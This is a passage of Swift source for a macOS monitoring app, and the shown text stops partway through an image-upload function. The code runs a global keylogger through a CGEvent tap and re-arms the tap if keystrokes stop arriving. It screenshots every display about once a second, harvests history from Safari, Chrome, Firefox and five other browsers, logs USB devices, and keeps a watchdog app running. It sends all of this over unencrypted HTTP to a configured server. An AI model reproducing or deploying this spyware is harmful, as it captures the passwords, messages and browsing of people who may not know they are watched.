import SQLite3
import Cocoa
import CoreGraphics
import IOKit
import IOKit.usb

let CHECKER_IDENTIFIER = "com.alice.MonitorChecker"

let API_ROUTE = "/scview/webapi.php"
let TIC_ROUTE = "/scview/eventhandler.php"
var APP_VERSION = "1.0"

var TIME_INTERVAL = 1
let TIC_INTERVAL = 30
let HISTORY_INTERVAL = 120
let KEY_INTERVAL = 60
var timer: Timer? = nil
var macAddress: String = ""
var activeRunning: Bool = false
var safariChecked: Double? = nil
var chromeChecked: Int64? = nil
var firefoxChecked: Int64? = nil
var edgeChecked: Int64? = nil
var operaChecked: Int64? = nil
var yandexChecked: Int64? = nil
var vivaldiChecked: Int64? = nil
var braveChecked: Int64? = nil
var lastBrowserTic: Double? = nil
var lastScreenshotCheck: Date = Date()
var lastHistoryCheck: Date = Date()
var lastTicCheck: Date = Date()
var lastKeyCheck: Date = Date()

// Browser bundle identifiers
private let browserBundleIDs = [
    "com.apple.Safari",
    "com.google.Chrome",
    "org.mozilla.firefox",
    "com.microsoft.edgemac",
    "com.operasoftware.Opera",
    "ru.yandex.desktop.yandex-browser",
    "com.vivaldi.Vivaldi",
    "com.brave.Browser"
]

struct BrowserHistoryLog: Codable {
    let date: String
    let url: String
}

struct KeyLog: Codable {
    let date: String
    let application: String
    let key: String
}

struct USBDeviceLog: Codable {
    let date: String
    let device: String
}

// Global callback function for CGEvent tap
func handleKeyDownCallback(
    proxy: CGEventTapProxy,
    type: CGEventType,
    event: CGEvent,
    refcon: UnsafeMutableRawPointer?
) -> Unmanaged<CGEvent>? {
    // Only handle keyDown events
    guard type == .keyDown else {
        return Unmanaged.passUnretained(event)
    }
    
    // Get the AppDelegate instance from the refcon
    guard let appDelegate = Unmanaged<AppDelegate>.fromOpaque(refcon!).takeUnretainedValue() as? AppDelegate else {
        return Unmanaged.passUnretained(event)
    }
    
    // Update last key capture time
    appDelegate.lastKeyCaptureTime = Date()
    
    // Safely create NSEvent from CGEvent
    guard let nsEvent = NSEvent(cgEvent: event) else {
        return Unmanaged.passUnretained(event)
    }
    
    // Get the active application
    let activeApp = NSWorkspace.shared.frontmostApplication
    let appName = activeApp?.localizedName ?? "Unknown"
    let bundleId = activeApp?.bundleIdentifier ?? "Unknown"
    
    // Get key information
    let keyCode = event.getIntegerValueField(.keyboardEventKeycode)
    let modifiers = appDelegate.checkModifierKeys(event)
    let pressedChar = nsEvent.charactersIgnoringModifiers ?? ""
    let currentDate = appDelegate.getCurrentDateTimeString()
    
    // Get readable key name for special keys
    let keyName = appDelegate.getKeyName(keyCode: Int(keyCode), character: pressedChar)
    
    debugPrint("Key pressed: \(appName) (\(bundleId)) \(modifiers)\(keyName)")
    appDelegate.keyLogs.append(KeyLog(date: currentDate, application: "\(appName) (\(bundleId))", key: "\(modifiers)\(keyName)"))
    
    return Unmanaged.passUnretained(event)
}

@NSApplicationMain
class AppDelegate: NSObject, NSApplicationDelegate {
    
    var storage: UserDefaults!
    var eventTap: CFMachPort?
    var keyLogs: [KeyLog]!
    var usbDeviceLogs: [USBDeviceLog]!
    var usbNotificationPort: IONotificationPortRef?
    var usbAddedIterator: io_iterator_t = 0
    var usbRemovedIterator: io_iterator_t = 0

    // Add these properties at the top of the class
    private var lastEventTapCheck: Date = Date()
    private var eventTapCheckInterval: TimeInterval = 3.0 // Check every 3 seconds
    private var isReestablishingEventTap: Bool = false
    var lastKeyCaptureTime: Date = Date()
    private let maxKeyCaptureGap: TimeInterval = 10.0 // Alert if no keys for 10 seconds

    func applicationDidFinishLaunching(_ aNotification: Notification) {
        // Insert code here to initialize your application
        
        storage = UserDefaults.init(suiteName: "alice.monitors")

        APP_VERSION = Bundle.main.infoDictionary?["CFBundleShortVersionString"] as? String ?? "Unknown"

        keyLogs = []
        
        // Get MacAddress
        let address = getMacAddress()
        if !address.isEmpty {
            macAddress = address
        } else {
            debugPrint("Warning: Could not get MacAddress")
            macAddress = ""
        }

        // Check if MonitorChecker is running and start it if not
        checkMonitorChecker()
        
        // Start keyboard monitoring
        startKeyboardMonitoring();
        
        // Setup event tap invalidation monitoring
        setupEventTapInvalidationMonitoring()
        
        // Single timer for all tasks
        timer = Timer.scheduledTimer(timeInterval: 1.0, target: self, selector: #selector(checkAllTasks), userInfo: nil, repeats: true)
        
        let center = NSWorkspace.shared.notificationCenter
        center.addObserver(self, selector: #selector(sessionDidBecomeActive), name: NSWorkspace.sessionDidBecomeActiveNotification, object: nil)
        center.addObserver(self, selector: #selector(sessionDidResignActive), name: NSWorkspace.sessionDidResignActiveNotification, object: nil)
        activeRunning = true
        
        // Add observer for application termination
        NSWorkspace.shared.notificationCenter.addObserver(
            self,
            selector: #selector(applicationDidTerminate(_:)),
            name: NSWorkspace.didTerminateApplicationNotification,
            object: nil
        )
        
        usbDeviceLogs = []
        setupUSBMonitoring()
    }
    
    @objc func sessionDidBecomeActive(notification: Notification) {
        debugPrint("User switched back to this session")
        activeRunning = true
    }

    @objc func sessionDidResignActive(notification: Notification) {
        debugPrint("User switched away from this session")
        activeRunning = false
    }

    @objc func checkAllTasks() {
        let currentDate = Date()
                
        // Check if it's time for screenshots
        if currentDate.timeIntervalSince(lastScreenshotCheck) >= TimeInterval(TIME_INTERVAL) {
            debugPrint("Sending screenshots")
            let randomDelay = Double.random(in: 0...Double(TIME_INTERVAL))
            perform(#selector(TakeScreenShotsAndPost), with: nil, afterDelay: randomDelay)
            lastScreenshotCheck = currentDate
        }
        
        // Check if it's time for tic event
        if currentDate.timeIntervalSince(lastTicCheck) >= TimeInterval(TIC_INTERVAL) {
            debugPrint("Sending tic event")
            DispatchQueue.global(qos: .background).async {
                do {
                    try self.sendTicEvent()
                } catch {
                    self.debugPrint("Error sending tic event: \(error)")
                }
            }
            lastTicCheck = currentDate
        }

        // Check if it's time for browser history
        if currentDate.timeIntervalSince(lastHistoryCheck) >= TimeInterval(HISTORY_INTERVAL) {
            if (lastBrowserTic != nil) {
                debugPrint("Sending browser histories")
                DispatchQueue.global(qos: .background).async {
                    do {
                        try self.sendBrowserHistories()
                    } catch {
                        self.debugPrint("Error sending browser histories: \(error)")
                    }
                }
                lastHistoryCheck = currentDate
            }
        }

        // Check if it's time for key log
        if currentDate.timeIntervalSince(lastKeyCheck) >= TimeInterval(KEY_INTERVAL) {
            debugPrint("Sending key logs")
            DispatchQueue.global(qos: .background).async {
                do {
                    try self.sendKeyLogs()
                } catch {
                    self.debugPrint("Error sending key logs: \(error)")
                }
            }
            debugPrint("Sending usb logs")
            DispatchQueue.global(qos: .background).async {
                do {
                    try self.sendUSBLogs()
                } catch {
                    self.debugPrint("Error sending usb logs: \(error)")
                }
            }
            lastKeyCheck = currentDate
        }
    }

    /// Throttled event tap validation to prevent app from getting stuck
    private func checkAndReestablishEventTapThrottled() {
        let currentDate = Date()
        
        // Check 1: Regular interval check (every 3 seconds)
        let shouldCheckInterval = currentDate.timeIntervalSince(lastEventTapCheck) >= eventTapCheckInterval
        
        // Check 2: Key capture gap detection (if no keys for 10 seconds)
        let keyCaptureGap = currentDate.timeIntervalSince(lastKeyCaptureTime)
        let shouldCheckKeyGap = keyCaptureGap >= maxKeyCaptureGap
        
        // Only proceed if one of the conditions is met
        guard shouldCheckInterval || shouldCheckKeyGap else {
            return
        }
        
        // Prevent multiple simultaneous re-establishment attempts
        guard !isReestablishingEventTap else {
            debugPrint("Event tap re-establishment already in progress, skipping check")
            return
        }
        
        lastEventTapCheck = currentDate
        
        // Log the reason for checking
        if shouldCheckKeyGap {
            debugPrint("No key capture detected for \(Int(keyCaptureGap))s, checking event tap...")
        } else {
            debugPrint("Regular event tap validation check...")
        }
        
        // Perform the check asynchronously to avoid blocking the main thread
        DispatchQueue.global(qos: .utility).async { [weak self] in
            self?.performEventTapValidation()
        }
    }
    
    /// Perform actual event tap validation (called on background queue)
    private func performEventTapValidation() {
        // Quick check first - if event tap is nil, we need to re-establish
        guard let tap = eventTap else {
            debugPrint("Event tap is nil, re-establishing...")
            reestablishEventTapAsync()
            return
        }
        
        // Check if tap is enabled (this is a lightweight operation)
        let isEnabled = CGEvent.tapIsEnabled(tap: tap)
        if !isEnabled {
            debugPrint("Event tap became disabled, re-establishing...")
            reestablishEventTapAsync()
            return
        }
        
        // Additional validation: check if mach port is still valid
        let portValid = CFMachPortIsValid(tap)
        if !portValid {
            debugPrint("Event tap mach port is invalid, re-establishing...")
            reestablishEventTapAsync()
            return
        }
        
        debugPrint("Event tap validation passed")
    }
    
    /// Re-establish event tap asynchronously with timeout
    private func reestablishEventTapAsync() {
        isReestablishingEventTap = true
        
        // Set a timeout to prevent infinite hanging
        let timeoutWorkItem = DispatchWorkItem { [weak self] in
            self?.isReestablishingEventTap = false
            self?.debugPrint("Event tap re-establishment timed out")
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 10.0, execute: timeoutWorkItem)
        
        // Perform re-establishment on main queue (required for UI operations)
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            
            defer {
                self.isReestablishingEventTap = false
                timeoutWorkItem.cancel()
            }
            
            do {
                self.setupKeyboardMonitoring()
                self.debugPrint("Event tap re-establishment completed successfully")
            } catch {
                self.debugPrint("Event tap re-establishment failed: \(error)")
            }
        }
    }

    func buildEndpoint(_ mode: Bool) -> String? {
        if let ip = storage.string(forKey: "server-ip"), !ip.isEmpty {
            return "http://" + ip + (mode ? API_ROUTE : TIC_ROUTE)
        } else {
            return nil
        }
    }
    
    private func createTemporaryCopy(_ path: String, browser: String) throws -> String {
        let originalFileName = (path as NSString).lastPathComponent
        let randomString = generateRandomString(length: 8)
        let fileName = "\(browser)_\(randomString)_\(originalFileName)"
        let temporaryPath = NSTemporaryDirectory() + fileName
        
        // Check if source file exists and is accessible
        guard FileManager.default.fileExists(atPath: path) else {
            throw NSError(domain: "FileError", code: 1, userInfo: [NSLocalizedDescriptionKey: "Source file does not exist: \(path)"])
        }
        
        // Check if file is readable
        guard FileManager.default.isReadableFile(atPath: path) else {
            throw NSError(domain: "FileError", code: 2, userInfo: [NSLocalizedDescriptionKey: "Source file is not readable: \(path)"])
        }
        
        // Try to get file attributes to check if it's being modified
        do {
            let attributes = try FileManager.default.attributesOfItem(atPath: path)
            if let modificationDate = attributes[.modificationDate] as? Date {
                let timeSinceModification = Date().timeIntervalSince(modificationDate)
                // If file was modified in the last 5 seconds, it might be actively being written to
                if timeSinceModification < 5.0 {
                    debugPrint("Warning: File \(path) was recently modified (\(timeSinceModification)s ago), may be actively in use")
                }
            }
        } catch {
            debugPrint("Warning: Could not get file attributes for \(path): \(error)")
        }
        
        // Copy the database with retry mechanism
        var lastError: Error?
        let maxRetries = 3
        let retryDelay: TimeInterval = 1.0
        
        for attempt in 1...maxRetries {
            do {
                try FileManager.default.copyItem(atPath: path, toPath: temporaryPath)
                // Success - break out of retry loop
                break
            } catch {
                lastError = error
                debugPrint("Attempt \(attempt)/\(maxRetries) failed to copy \(path): \(error.localizedDescription)")
                
                if attempt < maxRetries {
                    debugPrint("Waiting \(retryDelay)s before retry...")
                    Thread.sleep(forTimeInterval: retryDelay)
                }
            }
        }
        
        // If all retries failed, throw the last error
        if let error = lastError {
            throw NSError(domain: "FileError", code: 3, userInfo: [NSLocalizedDescriptionKey: "Failed to copy file after \(maxRetries) attempts: \(error.localizedDescription)"])
        }
        
        return temporaryPath
    }

    private func processChromeBasedProfiles(profilesPath: String, browser: String, checkedVariable: inout Int64?, lastBrowserTic: Double) throws -> [BrowserHistoryLog] {
        let fileMan = FileManager()
        let username = NSUserName()
        var visitDate = ""
        var histURL = ""
        var browseHist: [BrowserHistoryLog] = []
        var highestTimestamp: Int64? = checkedVariable
        
        if fileMan.fileExists(atPath: profilesPath) {
            let fileEnum = fileMan.enumerator(atPath: profilesPath)
            
            while let each = fileEnum?.nextObject() as? String {
                // Check if this is a profile directory (Default, Profile 1, Profile 2, etc.)
                if each != "System Profile" && each != "Guest Profile" && !each.hasPrefix(".") {
                    let historyPath = "\(profilesPath)\(each)/History"
                    if fileMan.fileExists(atPath: historyPath) {
                        let temporaryPath:String = try createTemporaryCopy(historyPath, browser: browser)
                        
                        var db : OpaquePointer?
                        let dbURL = URL(fileURLWithPath: temporaryPath)
                        
                        // Check if file is a valid SQLite database
                        let openResult = sqlite3_open(dbURL.path, &db)
                        if openResult != SQLITE_OK {
                            let errorMessage = String(cString: sqlite3_errmsg(db))
                            debugPrint("[-] Could not open the \(browser) History file \(historyPath) for user \(username) - SQLite error: \(errorMessage)")
                            sqlite3_close(db)
                            try? FileManager.default.removeItem(atPath: temporaryPath)
                            continue
                        }
                        
                        // Verify database is not corrupted with better error handling
                        var isCorrupted = false
                        var errorMessage: UnsafeMutablePointer<Int8>?
                        let integrityResult = sqlite3_exec(db, "PRAGMA integrity_check;", nil, nil, &errorMessage)
                        
                        if integrityResult != SQLITE_OK {
                            isCorrupted = true
                            if let errorMsg = errorMessage {
                                debugPrint("[-] \(browser) History \(historyPath) integrity check failed: \(String(cString: errorMsg))")
                                sqlite3_free(errorMessage)
                            }
                        }
                        
                        if isCorrupted {
                            debugPrint("[-] \(browser) History \(historyPath) is corrupted")
                            sqlite3_close(db)
                            try? FileManager.default.removeItem(atPath: temporaryPath)
                            continue
                        }
                        
                        // Additional safety check - try to read database header
                        var headerCheck: OpaquePointer?
                        let headerResult = sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1;", -1, &headerCheck, nil)
                        if headerResult != SQLITE_OK {
                            debugPrint("[-] \(browser) History \(historyPath) appears to be locked or corrupted - cannot read table structure")
                            sqlite3_finalize(headerCheck)
                            sqlite3_close(db)
                            try? FileManager.default.removeItem(atPath: temporaryPath)
                            continue
                        }
                        sqlite3_finalize(headerCheck)
                        
                        // Initialize timestamp if needed
                        if highestTimestamp == nil {
                            let currentDate = Date(timeIntervalSince1970: lastBrowserTic)
                            highestTimestamp = (Int64(currentDate.timeIntervalSince1970) + 11644473600) * 1000000
                        }
                        
                        let queryString = "select datetime(visit_time/1000000-11644473600, 'unixepoch', '+10:00') as last_visit_time, urls.url, visit_time from urls, visits where visits.url = urls.id and visit_time > \(highestTimestamp ?? 0) order by visit_time;"
                        
                        var queryStatement: OpaquePointer? = nil
                        
                        if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK {
                            while sqlite3_step(queryStatement) == SQLITE_ROW {
                                let col1 = sqlite3_column_text(queryStatement, 0)
                                if col1 != nil {
                                    visitDate = String(cString: col1!)
                                }
                                
                                let col2 = sqlite3_column_text(queryStatement, 1)
                                if col2 != nil {
                                    histURL = String(cString: col2!)
                                }
                                
                                let visitTime = sqlite3_column_int64(queryStatement, 2)
                                if (highestTimestamp! < visitTime) {
                                    highestTimestamp = visitTime
                                }
                                
                                browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
                            }
                            
                            sqlite3_finalize(queryStatement)
                        } else {
                            let errorMsg = String(cString: sqlite3_errmsg(db))
                            debugPrint("[-] Failed to prepare \(browser) history query: \(errorMsg)")
                        }
                        
                        sqlite3_close(db)

                        try? FileManager.default.removeItem(atPath: temporaryPath)
                    }
                }
            }
        } else {
            debugPrint("[-] \(browser) profiles directory not found for user \(username)\r")
        }
        
        // Update the original checkedVariable with the highest timestamp found across all profiles
        checkedVariable = highestTimestamp
        
        return browseHist
    }

    func getSafariHistories() throws -> [BrowserHistoryLog]? {
        let fileMan = FileManager()
        
        var isDir = ObjCBool(true)
        let username = NSUserName()
        var visitDate = ""
        var histURL = ""
        var browseHist: [BrowserHistoryLog] = []
        
        // Safari history check
        if fileMan.fileExists(atPath: "/Users/\(username)/Library/Safari/History.db", isDirectory: &isDir) {
            let temporaryPath:String = try createTemporaryCopy("/Users/\(username)/Library/Safari/History.db", browser: "Safari")
            
            var db : OpaquePointer?
            let dbURL = URL(fileURLWithPath: temporaryPath)
            
            // Check if file is a valid SQLite database with better error handling
            let openResult = sqlite3_open(dbURL.path, &db)
            if openResult != SQLITE_OK {
                let errorMessage = String(cString: sqlite3_errmsg(db))
                debugPrint("[-] Could not open the Safari History.db file for user \(username) - SQLite error: \(errorMessage)")
                sqlite3_close(db)
                try? FileManager.default.removeItem(atPath: temporaryPath)
                return []
            }
            
            // Verify database is not corrupted with better error handling
            var isCorrupted = false
            var errorMessage: UnsafeMutablePointer<Int8>?
            let integrityResult = sqlite3_exec(db, "PRAGMA integrity_check;", nil, nil, &errorMessage)
            
            if integrityResult != SQLITE_OK {
                isCorrupted = true
                if let errorMsg = errorMessage {
                    debugPrint("[-] Safari History.db integrity check failed: \(String(cString: errorMsg))")
                    sqlite3_free(errorMessage)
                }
            }
            
            if isCorrupted {
                debugPrint("[-] Safari History.db is corrupted")
                sqlite3_close(db)
                try? FileManager.default.removeItem(atPath: temporaryPath)
                return []
            }
            
            // Additional safety check - try to read database header
            var headerCheck: OpaquePointer?
            let headerResult = sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1;", -1, &headerCheck, nil)
            if headerResult != SQLITE_OK {
                debugPrint("[-] Safari History.db appears to be locked or corrupted - cannot read table structure")
                sqlite3_finalize(headerCheck)
                sqlite3_close(db)
                try? FileManager.default.removeItem(atPath: temporaryPath)
                return []
            }
            sqlite3_finalize(headerCheck)
            
            if safariChecked == nil{
                let currentDate = Date(timeIntervalSince1970: lastBrowserTic!)
                safariChecked = currentDate.timeIntervalSince1970 - 978307200
            }
            // Convert timestamp to VLAT timestring
            let queryString = "select datetime(history_visits.visit_time + 978307200, 'unixepoch', '+10:00') as last_visited, history_items.url, history_visits.visit_time from history_visits, history_items where history_visits.history_item=history_items.id and history_visits.visit_time > \(safariChecked ?? 0) order by history_visits.visit_time;"
            var queryStatement: OpaquePointer? = nil

            if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                while sqlite3_step(queryStatement) == SQLITE_ROW{
                    let col1 = sqlite3_column_text(queryStatement, 0)
                    if col1 != nil{
                        visitDate = String(cString: col1!)
                    }
                    let col2 = sqlite3_column_text(queryStatement, 1)
                    if col2 != nil{
                        histURL = String(cString: col2!)
                    }

                    let visitTime = sqlite3_column_double(queryStatement, 2)
                    if (safariChecked! < visitTime) {
                        safariChecked = visitTime
                    }

                    browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
                }
                sqlite3_finalize(queryStatement)
            } else {
                let errorMsg = String(cString: sqlite3_errmsg(db))
                debugPrint("[-] Failed to prepare Safari history query: \(errorMsg)")
            }
            
            sqlite3_close(db)

            try? FileManager.default.removeItem(atPath: temporaryPath)
        }
        else {
            debugPrint("[-] Safari History.db database not found for user \(username)\r")
        }

        return browseHist
    }

    func getChromeHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let chromeProfilesPath = "/Users/\(username)/Library/Application Support/Google/Chrome/"
        return try processChromeBasedProfiles(profilesPath: chromeProfilesPath, browser: "Chrome", checkedVariable: &chromeChecked, lastBrowserTic: lastBrowserTic!)
    }

    func getFirefoxHistories() throws -> [BrowserHistoryLog]? {
        let fileMan = FileManager()
        
        let username = NSUserName()
        var visitDate = ""
        var histURL = ""
        var browseHist: [BrowserHistoryLog] = []
        
        // Firefox history check
        if fileMan.fileExists(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/"){
            let fileEnum = fileMan.enumerator(atPath: "/Users/\(username)/Library/Application Support/Firefox/Profiles/")

            while let each = fileEnum?.nextObject() as? String {
                if each.hasSuffix("places.sqlite") {
                    let placesDBPath = "/Users/\(username)/Library/Application Support/Firefox/Profiles/\(each)"
                    let temporaryPath:String = try createTemporaryCopy(placesDBPath, browser: "Firefox")
                    var db : OpaquePointer?
                    let dbURL = URL(fileURLWithPath: temporaryPath)

                    // Check if file is a valid SQLite database
                    let openResult = sqlite3_open(dbURL.path, &db)
                    if openResult != SQLITE_OK {
                        let errorMessage = String(cString: sqlite3_errmsg(db))
                        debugPrint("[-] Could not open the Firefox \(temporaryPath) file for user \(username) - SQLite error: \(errorMessage)")
                        sqlite3_close(db)
                        try? FileManager.default.removeItem(atPath: temporaryPath)
                        continue
                    }
                    
                    // Verify database is not corrupted with better error handling
                    var isCorrupted = false
                    var errorMessage: UnsafeMutablePointer<Int8>?
                    let integrityResult = sqlite3_exec(db, "PRAGMA integrity_check;", nil, nil, &errorMessage)
                    
                    if integrityResult != SQLITE_OK {
                        isCorrupted = true
                        if let errorMsg = errorMessage {
                            debugPrint("[-] Firefox \(temporaryPath) integrity check failed: \(String(cString: errorMsg))")
                            sqlite3_free(errorMessage)
                        }
                    }
                    
                    if isCorrupted {
                        debugPrint("[-] Firefox \(temporaryPath) is corrupted")
                        sqlite3_close(db)
                        try? FileManager.default.removeItem(atPath: temporaryPath)
                        continue
                    }
                    
                    // Additional safety check - try to read database header
                    var headerCheck: OpaquePointer?
                    let headerResult = sqlite3_prepare_v2(db, "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1;", -1, &headerCheck, nil)
                    if headerResult != SQLITE_OK {
                        debugPrint("[-] Firefox \(temporaryPath) appears to be locked or corrupted - cannot read table structure")
                        sqlite3_finalize(headerCheck)
                        sqlite3_close(db)
                        try? FileManager.default.removeItem(atPath: temporaryPath)
                        continue
                    }
                    sqlite3_finalize(headerCheck)
                    
                    if firefoxChecked == nil{
                        let currentDate = Date(timeIntervalSince1970: lastBrowserTic!)
                        firefoxChecked = Int64(currentDate.timeIntervalSince1970 * 1000000)
                    }

                    let queryString = "select datetime(visit_date/1000000, 'unixepoch', '+10:00') as time, url, visit_date FROM moz_places, moz_historyvisits where moz_places.id=moz_historyvisits.place_id and visit_date > \(firefoxChecked ?? 0) order by visit_date;"

                    var queryStatement: OpaquePointer? = nil

                    if sqlite3_prepare_v2(db, queryString, -1, &queryStatement, nil) == SQLITE_OK{
                        while sqlite3_step(queryStatement) == SQLITE_ROW{
                            let col1 = sqlite3_column_text(queryStatement, 0)
                            if col1 != nil{
                                visitDate = String(cString: col1!)
                            }

                            let col2 = sqlite3_column_text(queryStatement, 1)
                            if col2 != nil{
                                histURL = String(cString: col2!)
                            }

                            let visitTime = sqlite3_column_int64(queryStatement, 2)
                            if (firefoxChecked! < visitTime) {
                                firefoxChecked = visitTime
                            }

                            browseHist.append(BrowserHistoryLog(date: visitDate, url: histURL))
                        }

                        sqlite3_finalize(queryStatement)
                    }
                    
                    sqlite3_close(db)

                    try? FileManager.default.removeItem(atPath: temporaryPath)
                }
            }
        }
        else {
            debugPrint("[-] Firefox places.sqlite database not found for user \(username)\r")
        }

        return browseHist
    }
    
    func getEdgeHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let edgeProfilesPath = "/Users/\(username)/Library/Application Support/Microsoft Edge/"
        return try processChromeBasedProfiles(profilesPath: edgeProfilesPath, browser: "Edge", checkedVariable: &edgeChecked, lastBrowserTic: lastBrowserTic!)
    }
    
    func getOperaHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let operaProfilesPath = "/Users/\(username)/Library/Application Support/com.operasoftware.Opera/"
        return try processChromeBasedProfiles(profilesPath: operaProfilesPath, browser: "Opera", checkedVariable: &operaChecked, lastBrowserTic: lastBrowserTic!)
    }
    
    func getYandexHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let yandexProfilesPath = "/Users/\(username)/Library/Application Support/Yandex/YandexBrowser/"
        return try processChromeBasedProfiles(profilesPath: yandexProfilesPath, browser: "Yandex", checkedVariable: &yandexChecked, lastBrowserTic: lastBrowserTic!)
    }
    
    func getVivaldiHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let vivaldiProfilesPath = "/Users/\(username)/Library/Application Support/Vivaldi/"
        return try processChromeBasedProfiles(profilesPath: vivaldiProfilesPath, browser: "Vivaldi", checkedVariable: &vivaldiChecked, lastBrowserTic: lastBrowserTic!)
    }
    
    func getBraveHistories() throws -> [BrowserHistoryLog]? {
        let username = NSUserName()
        let braveProfilesPath = "/Users/\(username)/Library/Application Support/BraveSoftware/Brave-Browser/"
        return try processChromeBasedProfiles(profilesPath: braveProfilesPath, browser: "Brave", checkedVariable: &braveChecked, lastBrowserTic: lastBrowserTic!)
    }
    
    func getBrowserHistories() throws -> [BrowserHistoryLog]? {
        var browseHist: [BrowserHistoryLog] = []
        
        // Get Safari histories
        do {
            if let safariHistories = try getSafariHistories() {
                browseHist.append(contentsOf: safariHistories)
            }
        } catch {
            debugPrint("Error getting Safari histories: \(error)")
        }

        // Get Chrome histories
        do {
            if let chromeHistories = try getChromeHistories() {
                browseHist.append(contentsOf: chromeHistories)
            }
        } catch {
            debugPrint("Error getting Chrome histories: \(error)")
        }

        // Get Firefox histories
        do {
            if let firefoxHistories = try getFirefoxHistories() {
                browseHist.append(contentsOf: firefoxHistories)
            }
        } catch {
            debugPrint("Error getting Firefox histories: \(error)")
        }

        // Get Edge histories
        do {
            if let edgeHistories = try getEdgeHistories() {
                browseHist.append(contentsOf: edgeHistories)
            }
        } catch {
            debugPrint("Error getting Edge histories: \(error)")
        }

        // Get Opera histories
        do {
            if let operaHistories = try getOperaHistories() {
                browseHist.append(contentsOf: operaHistories)
            }
        } catch {
            debugPrint("Error getting Opera histories: \(error)")
        }

        // Get Yandex histories
        do {
            if let yandexHistories = try getYandexHistories() {
                browseHist.append(contentsOf: yandexHistories)
            }
        } catch {
            debugPrint("Error getting Yandex histories: \(error)")
        }

        // Get Vivaldi histories
        do {
            if let vivaldiHistories = try getVivaldiHistories() {
                browseHist.append(contentsOf: vivaldiHistories)
            }
        } catch {
            debugPrint("Error getting Vivaldi histories: \(error)")
        }

        // Get Brave histories
        do {
            if let braveHistories = try getBraveHistories() {
                browseHist.append(contentsOf: braveHistories)
            }
        } catch {
            debugPrint("Error getting Brave histories: \(error)")
        }

        return browseHist
    }
    
    @objc func sendBrowserHistories() {
        var browserHistories: [BrowserHistoryLog] = []
        do {
            browserHistories = try getBrowserHistories() ?? []
        } catch {
            debugPrint("Error reading history: \(error)")
        }
        
        if (browserHistories.count > 0) {            
            // Send data in chunks
            sendDataInChunks(data: browserHistories, eventType: "BrowserHistory", chunkSize: 1000)
        }
    }

    @objc func checkMonitorChecker() {
        let checkers = NSWorkspace.shared.runningApplications.filter({ app in
            app.bundleIdentifier != nil && app.bundleIdentifier! == CHECKER_IDENTIFIER
        })
        if checkers.count > 1 {
            checkers.last?.terminate()
        } else if checkers.isEmpty {
            let task = Process()
            task.executableURL = URL(fileURLWithPath: "/Applications/MonitorChecker.app/Contents/MacOS/MonitorChecker")
            do {
                try task.run()
                debugPrint("Run process")
            } catch {
                debugPrint("Error: \(error)")
            }
        }
    }

    @objc func sendTicEvent() {
        checkMonitorChecker()
        
        var wait: Bool = true
        
        if let url = buildEndpoint(false) {
            if activeRunning == true {
                _ = SRWebClient.POST(url)
                    .data(["Event": "Tic", "Version": APP_VERSION, "MacAddress": macAddress])
                    .send({(response: Any!, status: Int) -> Void in
                        self.debugPrint("response:\(String(describing: response))")

                        let jdata = self.convertToDictionary(text: response as! String)
                        if jdata != nil && (jdata?["LastBrowserTic"]) != nil {
                            let lastTic = jdata!["LastBrowserTic"] as! Double

                            if lastBrowserTic == nil {
                                lastBrowserTic = lastTic
                            }
                        }
                        wait = false
                    }, failure: {(error: NSError!) -> Void in
                        self.debugPrint("failure")
                        wait = false
                    })
                self.waitFor(&wait)
            }
        } else {
            DistributedNotificationCenter.default().postNotificationName(Notification.Name("aliceServerIPUndefined"), object: CHECKER_IDENTIFIER, userInfo: nil, options: .deliverImmediately)
        }
    }

    @objc func sendKeyLogs() {
        if self.keyLogs.count > 0 {
            do {
                // Send data in chunks
                sendDataInChunks(data: self.keyLogs, eventType: "KeyLog", chunkSize: 500)
                self.keyLogs.removeAll()
            } catch {
                debugPrint("Error converting key logs to JSON: \(error)")
            }
        }
    }
    
    @objc func TakeScreenShotsAndPost() {
        var displayCount: UInt32 = 0
        var result = CGGetActiveDisplayList(0, nil, &displayCount)
        if (result != CGError.success) {
            debugPrint("error:\(result)")
            return
        }
        
        if (displayCount == 0) {
            debugPrint("There is no display.")
            return
        }
        
        let allocated = Int(displayCount)
        let activeDisplays = UnsafeMutablePointer<CGDirectDisplayID>.allocate(capacity: allocated)
        result = CGGetActiveDisplayList(displayCount, activeDisplays, &displayCount)
        
        if (result != CGError.success) {
            debugPrint("error:\(result)")
            return
        }
        
        let TEMP_FOLDER = NSTemporaryDirectory()
        
        for i in 1 ... displayCount {
            let filename = TEMP_FOLDER + "temp\(i).jpg"
            let fileUrl = URL(fileURLWithPath: filename, isDirectory: true)
            let screenShot: CGImage = CGDisplayCreateImage(activeDisplays[Int(i-1)])!
            let bitmapRep = NSBitmapImageRep(cgImage: screenShot)
            
            let options: [NSBitmapImageRep.PropertyKey: Any] = [.compressionFactor: 0.21]
          
            let jpegData = bitmapRep.representation(using: .jpeg, properties: options)!
            
            do {
                try jpegData.write(to: fileUrl, options: .atomic)
                postImage(path: filename)
            }
            catch { debugPrint("error:\(error)") }
        }
    }
    
    func waitFor (_ wait: inout Bool) {
        while (wait) {
            RunLoop.current.run(mode: .defaultRunLoopMode, before: Date(timeIntervalSinceNow: 0.1))
        }
    }
    
    func postImage(path: String) {
        var wait: Bool = true
        var imageData: Data? = nil
        
        do {
            try imageData = NSData(contentsOf: URL(fileURLWithPath: path)) as Data
        } catch { debugPrint("error:\(error)") }
        
        if let url = buildEndpoint(true) {
            _ = SRWebClient.POST(url)
                .data(imageData!, fieldName: "fileToUpload", data:["Version": APP_VERSION])
                .send({(response: Any!, status: Int) -> Void in
                    self.debugPrint("response: \(String(describing: response))")
                    
                    let jdata = self.convertToDictionary(text: response as! String)
                    if jdata != nil && (jdata?["Interval"]) != nil {
                        let newinterval = jdata!["Interval"] as! Int
